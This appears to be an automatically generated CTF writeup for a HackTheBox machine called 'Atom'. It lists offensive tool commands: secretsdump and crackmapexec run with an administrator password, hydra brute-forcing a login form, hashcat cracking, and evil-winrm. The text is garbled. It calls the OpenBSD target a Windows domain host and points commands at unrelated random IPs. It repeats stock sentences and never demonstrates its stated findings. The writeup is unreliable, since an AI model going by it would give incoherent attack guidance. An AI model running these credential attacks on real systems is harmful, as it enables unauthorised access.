---
TitleSEO: "HackTheBox — Atom (Easy OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Atom (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Atom. Resource-Based Constrained Delegation and Sudo Misconfiguration to achieve easy compromise on OpenBSD."
Keywords: "ctf, windows, insane, linux, tryhackme, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-atom-200.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-atom-200/"
Date: "2024-01-02"
Tags: "CTF, Windows, Insane, Linux, TryHackMe, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-atom-200"
Permalink: "/writeups/htb-atom-200.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Atom** is rated **Easy** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.99.5.84`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.245.57
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.145.146
crackmapexec smb 10.101.240.62 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p9200,8888,110 10.102.13.243 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```bash
crackmapexec smb 10.20.10.88 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.31.8.71 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **Sudo Misconfiguration**.

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p3268,80,464 10.124.244.60 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.20.91 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.6.188 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.59.180/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```powershell
nmap -sCV -p8888,8888,389 10.12.18.172 -oN scan.txt
nmap -sCV -p5432,22,8888 10.12.180.237 -oN scan.txt
crackmapexec smb 10.10.210.202 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `evil-winrm`
- `ffuf`
- `secretsdump`
- `metasploit`
- `john`
- `psexec`

### Key Takeaways

- Resource-Based Constrained Delegation
- Sudo Misconfiguration
